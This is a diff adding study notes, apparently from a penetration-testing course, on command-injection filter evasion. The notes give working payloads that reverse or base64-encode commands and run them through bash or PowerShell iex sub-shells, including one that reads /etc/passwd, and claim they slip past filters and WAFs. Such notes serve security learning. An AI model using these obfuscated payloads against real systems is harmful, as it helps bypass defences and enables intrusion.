@@ -381,3 +381,71 @@ there are many other commands to do similar things like:
 
 ![](Images/Pasted%20image%2020240202144301.png)
 
+### Reversed commands 
+
+another technique is to reverse commands and have a command template that switches them back and executes them in real time   
+in this case we will be writing `imaohw` to avoid triggering the blacklisted command 
+
+we can reverse a string in linux with: 
+
+`echo 'whoami' | rev`
+
+once we have our reversed string we can execute the original command by reversing it back in a sub-shell: 
+
+`$(rev<<<'imaohw')`
+
+![](Images/Pasted%20image%2020240202182807.png)
+
+in windows we can reverse a string with: 
+
+`"whoami"[-1..-20] -join ''`
+
+then we can execute the reversed string in a powershell sub-shell: 
+
+`iex "$('imaohw'[-1..-20] -join '')"`
+
+### Encoded commands 
+
+some commands may contain filtered characters or characters that are URL-decoded by the server
+
+we can use various encoding tools like base64 or xxd 
+
+first we can encode our payload:
+
+`echo -n 'cat /etc/passwd/ | grep 33' | base64`
+
+then we can create a command to decode the encoded string in a sub-shell and pass it to bash to be executed with `bash<<<`:
+
+`bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)`
+
+note that `<<<` can be used to avoid using `|` which is a filtered character 
+
+![](Images/Pasted%20image%2020240202184004.png)
+
+if commands like `base64` or `bash` are filtered then we can use techniques like character insertion or use alternatives like `sh` for command execution and `openssl` for base64 decoding or xxd for hex decoding 
+
+for windows we can encode our string: 
+
+`[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))`
+
+we could also do the same on linux but we have to convert the string from utf-8 to utf-16 before we base64 it: 
+
+`echo -n whoami | iconv -f utf-8 -t utf-16le | base64`
+
+then we can decode the base64 string and execute it with a powershell sub-shell: 
+
+`iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"`
+
+these types of obfuscation methods have not been used before because we decide how we want to hide our commands, so they are likely to bypass filters and WAFs 
+
+in addition to these methods we can use other methods like wildcards, regex, output redirection, integer expansion, and many others   
+PayloadAllTheThings has more of these methods
+
+if we wanted to use the payload `find /usr/share/ | grep root | grep mysql | tail -n 1`, we could first base64 encode it: 
+
+![](Images/Pasted%20image%2020240202184745.png)
+
+then use it in a sub-shell to get the output: 
+
+![](Images/Pasted%20image%2020240202185207.png)
+
